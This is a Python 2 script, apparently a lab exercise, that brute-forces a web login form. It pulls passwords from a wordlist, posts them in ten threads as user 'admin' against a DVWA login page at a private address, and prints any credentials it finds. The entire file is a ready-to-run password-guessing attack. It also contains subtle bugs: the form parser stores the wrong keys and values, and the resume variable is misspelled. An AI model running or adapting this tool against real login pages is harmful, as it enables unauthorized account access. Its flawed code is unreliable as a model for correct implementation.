#-*-coding:utf-8-*-
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

#简要设置
user_thread = 10
username = "admin"
wordlist_file = "/root/password.lst"

resume = None

target_url = "http://192.168.2.130:81/login.php"
target_post = "http://192.168.2.130:81/login.php"

username_field ="username"
password_field ="password"

false_check ="DVWA"

########################################################################
class Brtuer(object):

    #----------------------------------------------------------------------
    def __init__(self,username,words):
        self.username =username
        self.password_q =words
        self.found = False
        
        
        print "Finished setting up for: %s" % username
        
    #----------------------------------------------------------------------
    def run_brutefoce(self):
        for i in range(user_thread):
            
            t = threading.Thread(target=self.web_bruter)
            t.start()
    
    #----------------------------------------------------------------------
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            response =opener.open(target_url)
            
            page = response.read()
            
            print "Trying:(%s=>%s) [%d left]" % (self.username,brute,self.password_q.qsize())
            
            #初始我们写的类并解析页面
            parser = BruterParser()
            parser.feed(page)
            post_tags = parser.tag_results
            
            #构造参数
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            
            login_data = urllib.urlencode(post_tags)
            #print login_data
            login_response = opener.open(target_post,login_data)
            login_result = login_response.read()
            
            if false_check not in login_result:
                self.found =True
                
                print "\033[1;32;41m[*] Brute Bruteforce successful"
                print "\033[1;32;41m[*] Username=%s" %username
                print "\033[1;32;41m[*] Password=%s" %brute
                print "\033[1;32;41m[*] Waiting for other threads exit...\033[0m"
        
        
########################################################################
class BruterParser(HTMLParser):

    #----------------------------------------------------------------------
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
    #----------------------------------------------------------------------
    def handle_starttag(self,tag,attrs):
        if tag == "input":
            tag_name =None
            tag_value =None
            for name,value in attrs:
                if name =="name":
                    tag_name =name
                if name =="value":
                    tag_value =value
                    
            if tag_name is not None:
                self.tag_results[tag_name] =value
        
        
#----------------------------------------------------------------------
resumae = None
def build_wordlist(wordlist_file):
    #读入目录字典
    fd =open(wordlist_file, mode='rb')
    raw_words =fd.readlines()
    fd.close()
    
    found_resume = False
    #定义线程对象
    words = Queue.Queue()
    #print raw_words
    for word in raw_words:
        word  =word.rstrip()
        if resumae is not None:
            if found_resume:
                words.put(word)
            else:
                if word ==resumae:
                    found_resume =True
                    print "Resume wordlist from:%s" % resumae
        else:
            words.put(word)
    return words


words = build_wordlist(wordlist_file)

bruter_obj = Brtuer(username,words)
bruter_obj.run_brutefoce()